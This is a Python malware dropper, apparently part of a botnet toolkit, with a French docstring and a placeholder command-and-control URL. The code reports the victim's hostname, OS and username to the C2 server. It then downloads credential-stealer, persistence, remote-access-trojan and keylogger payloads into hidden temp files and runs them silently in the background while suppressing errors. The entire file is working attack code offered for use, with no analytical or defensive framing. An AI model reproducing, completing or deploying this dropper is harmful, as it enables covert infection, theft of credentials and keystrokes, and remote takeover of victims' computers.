#!/usr/bin/env python3
"""
payloads/dropper.py — Stager chain
Enregistre le bot + installe keylogger, stealer,
rat, persistence en arrière-plan.
Variables : FILL_C2_URL FILL_C2_HOST FILL_PORT
"""
import os, sys, stat, json, socket
import platform, tempfile, subprocess
import urllib.request

C2     = "FILL_C2_URL"
BOT_ID = socket.gethostname()
PY     = ("pythonw" if platform.system() == "Windows"
          else "python3")
FLAGS  = (0x08000000
          if platform.system() == "Windows"
          else 0)

def _post(url: str, data: dict):
    try:
        payload = json.dumps(data).encode()
        req = urllib.request.Request(
            url, data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=8)
    except Exception:
        pass

def register():
    _post(f"{C2}/c2/register", {
        "id":   BOT_ID,
        "os":   platform.platform(),
        "user": os.getlogin(),
        "type": "dropper",
    })

def fetch_and_exec(name: str):
    url  = f"{C2}/payload?name={name}"
    dest = os.path.join(
        tempfile.gettempdir(),
        f".fl_{name}.py"
    )
    try:
        urllib.request.urlretrieve(url, dest)
        os.chmod(dest, stat.S_IRWXU)
        subprocess.Popen(
            [PY, dest],
            close_fds=True,
            creationflags=FLAGS,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except Exception:
        pass

register()
for p in ["stealer", "persistence",
          "rat", "keylogger_win"]:
    fetch_and_exec(p)